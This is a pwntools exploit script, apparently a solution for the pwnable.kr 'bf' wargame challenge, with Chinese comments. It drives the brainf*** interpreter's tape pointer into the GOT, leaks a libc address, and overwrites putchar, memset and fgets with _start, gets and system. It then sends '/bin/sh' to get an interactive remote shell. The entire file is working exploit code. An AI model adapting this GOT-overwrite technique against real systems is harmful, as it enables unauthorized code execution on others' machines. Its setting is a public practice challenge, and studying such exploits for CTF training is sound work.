from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./bf')

# 本地
# p = process('./bf')
# libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

# 远程
p = remote('pwnable.kr', '9001')
libc = ELF('./bf_libc.so')

pause()

# p初始为0x804a0a0
# _IO_2_1_stdout_的GOT表地址0x804a060
payload = b'<' * (0x40 - 3) # p指向0x804a063
payload += b'.' # 打印0x804a063处的内容
payload += b'<' + b'.' # 打印0x804a062处的内容
payload += b'<' + b'.' # 打印0x804a061处的内容
payload += b'<' + b'.' # 打印0x804a060处的内容

# 接下来将putchar的GOT地址设置为_start
# 将memset设置为gets
# 将fgets设置为system
# putchar的GOT地址为0x804a030
# memset的GOT地址为0x0804a02c
# fgets的GOT地址为0x0804a010
payload += b'<' * (0x30 - 3) # p指向0x804a033
payload += b',' # 写入0x804a033
payload += b'<' + b',' # 写入0x804a032
payload += b'<' + b',' # 写入0x804a031
payload += b'<' + b',' # 写入0x804a030
payload += b'<' + b',' # 写入0x804a02f
payload += b'<' + b',' # 写入0x804a02e
payload += b'<' + b',' # 写入0x804a02d
payload += b'<' + b',' # 写入0x804a02c
payload += b'<' * (0x1c - 3) # p指向0x0804a013
payload += b',' # 写入0x0804a013
payload += b'<' + b',' # 写入0x804a012
payload += b'<' + b',' # 写入0x804a011
payload += b'<' + b',' # 写入0x804a010
payload += b'.' # 调用putchar函数

p.sendlineafter(b'[ ]\n', payload)
stdout_addr = p.recv(1)
stdout_addr = p.recv(1) + stdout_addr
stdout_addr = p.recv(1) + stdout_addr
stdout_addr = p.recv(1) + stdout_addr
stdout_addr = u32(stdout_addr)
libc.address = stdout_addr - libc.sym['_IO_2_1_stdout_']
print('stdout addr: %x' %stdout_addr)
print('system addr: %x' %libc.sym['system'])

_start_addr = p32(elf.sym['_start'])
gets_addr = p32(libc.sym['gets'])
system_addr = p32(libc.sym['system'])
p.send(p8(_start_addr[3]))
p.send(p8(_start_addr[2]))
p.send(p8(_start_addr[1]))
p.send(p8(_start_addr[0]))
p.send(p8(gets_addr[3]))
p.send(p8(gets_addr[2]))
p.send(p8(gets_addr[1]))
p.send(p8(gets_addr[0]))
p.send(p8(system_addr[3]))
p.send(p8(system_addr[2]))
p.send(p8(system_addr[1]))
p.send(p8(system_addr[0]))

p.sendline(b'/bin/sh')

p.interactive()
